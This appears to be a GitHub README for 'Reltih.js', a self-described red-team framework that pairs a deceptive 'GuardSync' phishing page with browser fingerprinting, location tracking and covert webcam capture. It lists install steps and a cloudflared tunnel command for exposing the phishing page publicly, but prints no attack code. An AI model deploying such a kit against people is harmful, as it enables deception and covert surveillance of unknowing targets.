<!-- HEADER -->
<div align="center">

![header](https://capsule-render.vercel.app/api?type=blur&height=300&color=gradient&text=Reltih.js&section=header&reversal=true&desc=Advanced%20Red%20Team%20Reconnaissance%20%26%20Browser%20Intelligence%20Tracking&animation=fadeIn&fontColor=white&textBg=false)

<br/>

[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
[![Flask](https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)

</div>

## `$ cat about.json`

```json
┌──(Reltih㉿Framework)-[~]
└─$ bat about.json

{
  "name"        : "Reltih.js",
  "type"        : "Offensive Security Tool",
  "goal"        : "Advanced Target Reconnaissance",
  "description" : "A highly stealthy fingerprinting and reconnaissance framework designed for Red Teamers. Deploys covert payloads to gather extensive browser telemetry, network data, hardware specifications, and live location info before gaining internal access.",
  "features"    : [
    "Zero-Trust Phishing Facade (GuardSync Theme)",
    "Deep Browser Fingerprinting (WebGL, Canvas, Audio, Fonts)",
    "Hardware & Environment Analysis (VM/Sandbox Detection)",
    "Live Location Tracking & IP Profiling",
    "Covert Webcam Image Capturing",
    "Intelligent Risk & Trust Scoring Engine"
  ]
}
```

<br clear="right"/>

## `$ Reltih.js --features`

```javascript
┌──(Reltih㉿Framework)-[~]
└─$ node features.js

class ReltihFramework {
    constructor() {
        this.capabilities = [
            "Advanced Fingerprinting System",
            "VM / Sandbox / Bot Classification",
            "Live Web Dashboard with Device Tracking",
            "Geolocational Trail logging",
            "Stealth Camera Capture & Remote Extraction"
        ];
        this.deployment = ["Cloudflared integration", "Flask Backend", "Waitress Prod Server"];
    }

    mission() {
        return "Providing deep target intelligence prior to internal network exploitation.";
    }
}

const payload = new ReltihFramework();
console.log(payload.mission());
// Output: Providing deep target intelligence prior to internal network exploitation.
```

## `$ Screen Captures`

<div align="center">

### 🎣 GuardSync Phishing Facade
> A sleek, convincing "Zero-Trust Security" landing page to deceive targets and collect initial telemetry.

![Client Phishing Page / GuardSync](./target-phishing.png)
*(Note: Please replace `./target-phishing.png` with the actual path to your uploaded screenshot)*

<br>

### 💻 Reltih.js Command Dashboard
> Real-time device monitoring, trust analysis (Risk Scoring), and identity overview all in one terminal-themed hub.

![Dashboard Page](./dashboard-panel.png)
*(Note: Please replace `./dashboard-panel.png` with the actual path to your uploaded screenshot)*

</div>

## `$ Installation & Setup`

```bash
# 1. Clone the repository
git clone https://github.com/iNarrow12/Reltih.js.git
cd Reltih.js

# 2. Install backend dependencies
pip install flask waitress requests

# 3. Start the Reltih server
python server.py

# 4. Access the Dashboard & Phishing interface
# Dashboard URL: http://localhost:5000/dashboard
# Phishing URL:  http://localhost:5000/
```

## `$ Deployment`

<div align="center">

> Reltih.js natively supports tunneling via Cloudflare to expose your phishing endpoint to the public web securely.

[![Cloudflare](https://img.shields.io/badge/Cloudflare-F38020?style=for-the-badge&logo=Cloudflare&logoColor=white)](https://cloudflare.com)

</div>

```bash
# Run the included cloudflared binary to expose your local Flask server
cloudflared.exe tunnel --url http://localhost:5000
```

## `$ Architecture Overview`

- `index.html`: The deceptive "GuardSync" phishing landing page.
- `dashboard.html`: The Red Teamer's internal monitoring dashboard.
- `server.py`: Flask-based API handling telemetry logging, camera uploads, and UI serving.
- `engine.py`: The `DeviceIntelligenceEngine` used to calculate Risk, evaluate Trust scores, and flag bots.
- `fp/*`: Core fingerprinting JavaScript modules (`os.js`, `browser.js`, `murmur.js`, `timing.js`, `environment.js`).
- `Database/`: Automatically generated storage directory holding session traces, map locations, and camera captures per device.

<div align="center">

<br>

![Disclaimer](https://img.shields.io/badge/Disclaimer-For_Educational_and_Authorized_Red_Teaming_Only-red?style=for-the-badge)

<br><br>

![footer](https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12,20,24&height=120&section=footer&animation=twinkling)

</div>
